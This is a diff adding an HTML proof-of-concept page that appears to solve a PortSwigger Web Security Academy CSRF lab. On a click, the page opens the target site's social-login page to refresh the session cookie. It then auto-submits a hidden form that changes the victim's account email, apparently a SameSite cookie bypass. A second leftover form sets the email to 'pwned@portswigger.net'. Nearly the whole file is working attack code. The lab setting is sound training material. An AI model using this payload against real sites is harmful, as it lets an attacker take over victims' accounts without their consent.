@@ -1,0 +1,29 @@
+<html>
+    <body>
+
+        <form id="csrf-form" method="POST" action="https://0ad900af0329cf7383e528d900d90013.web-security-academy.net/my-account/change-email">
+
+            <input type="hidden" name="email" value="test9@tester.ca">
+
+        </form>
+    
+        <p>Click anywhere on the page</p>
+    </body>
+
+    <script>
+        window.onclick = () => {
+            window.open('https://0ad900af0329cf7383e528d900d90013.web-security-academy.net/social-login');
+
+            setTimeout(changeEmail, 5000);
+        }
+
+        function changeEmail() {
+            document.getElementById('csrf-form').submit();
+        }
+    </script>
+</html>
+
+<form method="POST" action="https://0ad900af0329cf7383e528d900d90013.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@portswigger.net">
+</form>
+<p>Click anywhere on the page</p>
